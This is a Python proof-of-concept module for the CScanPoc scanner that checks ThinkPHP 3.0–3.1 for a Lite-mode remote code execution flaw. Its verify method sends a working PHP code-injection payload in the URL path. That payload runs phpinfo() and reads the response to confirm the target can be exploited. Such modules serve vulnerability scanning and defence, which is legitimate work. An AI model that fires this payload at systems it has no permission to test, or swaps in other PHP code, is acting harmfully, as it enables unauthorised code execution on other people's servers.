# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'ThinkPHP_0011'  # 平台漏洞编号，留空
    name = 'ThinkPHP 3.0-3.1版代码执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2015-03-15'  # 漏洞公布时间
    desc = '''
        ThinkPHP扩展类库的漏洞已经查明原因：系官方扩展模式中的Lite精简模式中存在可能的漏洞（原先核心更新安全的时候 并没有更新模式扩展部分，现已更新）。

        对于使用标准模式或者其他模式的用户不存在此漏洞，敬请放心。3.2版本已经对扩展重新设计（原来的模式扩展、引擎扩展均不再支持），也不存在此问题。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/1402/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'ThinkPHP'  # 漏洞应用名称
    product_version = 'ThinkPHP 3.0-3.1版'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'b3f40395-84a6-40b4-a861-2b1787c4ee15'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/index.php/Index/index/name/$%7B@phpinfo%28%29%7D'
            url = self.target + payload
            r = requests.get(url)

            if r.status_code == 200 and 'PHP Version' in r.text and 'System' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
